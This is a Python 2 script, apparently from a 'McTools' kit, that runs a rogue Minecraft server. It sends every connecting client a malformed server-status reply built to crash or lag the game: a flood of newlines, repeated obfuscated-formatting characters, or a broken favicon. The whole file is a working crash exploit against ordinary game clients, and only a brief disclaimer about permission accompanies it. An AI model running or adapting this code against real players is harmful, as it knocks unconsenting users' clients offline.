"""
@author: OlfillasOdikno
@info: This tool was written in good faith. Please do not abuse this tool. Use it only with permission of the person/company you want to test.
@license:
/*****************************************************************************
 * McTools                                                                   *
 * Copyright (C) 2017 Olfillas Odikno                                        *
 *                                                                           *
 * This program is free software: you can redistribute it and/or modify      *
 * it under the terms of the GNU General Public License as published by      *
 * the Free Software Foundation, either version 3 of the License, or         *
 * (at your option) any later version.                                       *
 *                                                                           *
 * This program is distributed in the hope that it will be useful,           *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of            *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             *
 * GNU General Public License for more details.                              *
 *                                                                           *  
 * You should have received a copy of the GNU General Public License         *
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.     *
 *****************************************************************************/
"""

import socket
def encodeInt(num):
  ret = b''
  while True:
    write = num & 0x7F
    num >>= 7
    if num:
      ret += chr(write | 0x80)
    else:
      ret += chr(write)
      break
  return ret
  
def encodeString(s):
  return encodeInt(len(s)) + s
  
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("",25565))
s.listen(5)
resp= """{
    "version": {
        "name": "Crash",
        "protocol": 666
    },
    "players": {
        "max": 1337,
        "online": 42,
        "sample": []
    },  
    "description": {
        "text": "{%crash%}"
      }
    {%crashv3%}
}"""
payload = ""
print "[*] Select the payload!"
test = raw_input("[0] for instant-crash (by GalaxyHD) or [1] to make the client laggy or [2] for icon-crash (fixed in 1.11): ")
if(test == "1"):
  crashChar = u"\u00A7kA"
  payload = resp.replace("{%crash%}","\n\n\n"+crashChar*1001*10).replace("{%crashv3%}",'')
elif(test == "2"):
  payload = resp.replace("{%crash%}","Take down this machine!!!").replace("{%crashv3%}",',"favicon": "data:image/png;base64,."')
else:
  crashChar = "\n"
  payload = resp.replace("{%crash%}","\n\n\n"+crashChar*1001*10).replace("{%crashv3%}",'')
while True:
    connect, address = s.accept()
    print "[*] New Connection from {0}".format(address)
    result = connect.recv(2048)
    connect.send(encodeString('\x00'+ encodeString(payload.encode('utf-8'))))
    print "[*] The Client of {0} should have crashed.".format(address)
